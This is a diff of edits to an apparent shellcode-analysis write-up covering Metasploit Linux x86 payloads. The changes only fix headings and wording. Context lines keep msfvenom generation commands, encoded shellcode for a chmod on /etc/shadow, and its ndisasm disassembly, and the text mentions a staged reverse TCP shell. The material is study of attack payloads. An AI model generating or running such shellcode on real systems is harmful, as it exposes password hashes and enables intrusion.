@@ -75,7 +75,7 @@ root@kali:~# msfvenom --list payloads |grep "linux/x86"
 
 For the first shellcode, let's analyze a simple one, using only *ndisasm*.
 
-##Payload options
+## Payload options
 
 ```
 # msfvenom -p linux/x86/chmod --list-options
@@ -124,9 +124,9 @@ unsigned char buf[] =
 "\xa8\xee\xba\x14\x6a\x99\xf2\x14\x8c\x59\xa3\xdb\x0c\x33\x52"
 "\xbc\xc1\x44";
 ```
-##Analysis
+## Analysis
 
-Let's disassamble the code using ndisasm
+Let's disassamble the code using ndisasm:
 ```
 $ echo -ne "\xd9\xf6\xb8\x40\xf8\x6f\x5b\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x0a\x31\x46\x17\x03\x46\x17\x83\x86\xfc\x8d\xae\x9f\x97\x5e\x09\xcd\x8f\x6d\xa9\xf1\x4f\x41\xcc\x85\x2c\xb2\x7d\x0d\xd2\xa8\xee\xba\x14\x6a\x99\xf2\x14\x8c\x59\xa3\xdb\x0c\x33\x52\xbc\xc1\x44" |ndisasm -u
 00000000  99                cdq
@@ -150,7 +150,7 @@ $ echo -ne "\xd9\xf6\xb8\x40\xf8\x6f\x5b\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x0a\x31
 00000022  CD80              int 0x80
 ```
 
-By looking this code, between 0000000A and 00000014 we can read /etc/shadow. The code is the following
+By looking this code, between 0000000A and 00000014 we can read the string */etc/shadow*. The assembly code is:
 ```ASM
 	cdq
 	push 0xf ;chmod
@@ -214,7 +214,7 @@ Description:
 ```
 ## Payload
 ```
-# # msfvenom -p linux/x86/exec CMD=/bin/ls -b \x00 R |ndisasm -u -
+# msfvenom -p linux/x86/exec CMD=/bin/ls -b \x00 R |ndisasm -u -
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 Found 11 compatible encoders
@@ -248,7 +248,7 @@ Payload size: 43 bytes
 
 ```
 
-It is important to notice that generate the same paylaod another time will return another code 
+It is important to notice that generate the same paylaod another time will return another code:
 
 ```
 # msfvenom -p linux/x86/exec CMD=/bin/ls -b \x00 R |ndisasm -u -
@@ -289,7 +289,7 @@ Payload size: 70 bytes
 
 ```
 
-##Analysis
+## Analysis
 
 Using *libemu* return C like code very easy to understand.
 
@@ -319,7 +319,7 @@ int execve (
 
 # linux/x86/shell/reverse_tcp
 
-In metasploit, payloads like *OS/ARCH/shell/something* are staged payloads while *OS/ARCH/shell_something* are stagedless payloads. Let's analyse a stagged payload. In order to no complicate the analysis of every stage, null byte will not be removed.
+In Metasploit, payloads like *OS/ARCH/shell/something* are staged payloads while *OS/ARCH/shell_something* are stagedless payloads. Let's analyse a stagged payload. In order to no complicate the analysis of every stage, null byte will not be removed.
 
 ## Payload options
 
@@ -384,7 +384,7 @@ No encoder or badchars specified, outputting raw payload
 Payload size: 68 bytes
 ```
 
-We can notice that the stageless payload has the same size for both cases.
+We can notice that the stageless payload have the same size for both cases.
 
 ## Payload
 
